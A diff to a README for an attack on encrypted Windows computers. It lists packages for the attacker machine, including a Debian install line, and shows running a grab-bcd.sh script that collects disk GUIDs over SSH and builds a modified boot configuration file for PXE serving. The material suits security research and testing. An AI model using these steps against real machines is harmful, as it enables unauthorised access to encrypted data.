@@ -14,7 +14,12 @@ In order to carry out this attack, the encrypted computer must meet certain requ
 ### Software requirements for the attacker machine
 The following packages have to be installed on the attacker machine:
 - dnsmasq
-- impacket-smbserver
+- hivexregedit
+
+For debian based systems:
+```bash
+sudo apt install dnsmasq libwin-hivex-perl
+```
 
 ## How to perform the attack
 The attack consists of two separate steps.
@@ -40,7 +45,7 @@ On the victim machine you can identify the drive containing the Windows installa
 
 On the attacker machine execute the BCD extractor script:
 ```
-./grab-bcd.sh /dev/sda
+$ ./grab-bcd.sh /dev/sda
 [+] Info: Grabbing disk and partition GUIDs via SSH...
 [...]
 [+] Info: Created modified BCD file: PXE-Server/Boot/BCD
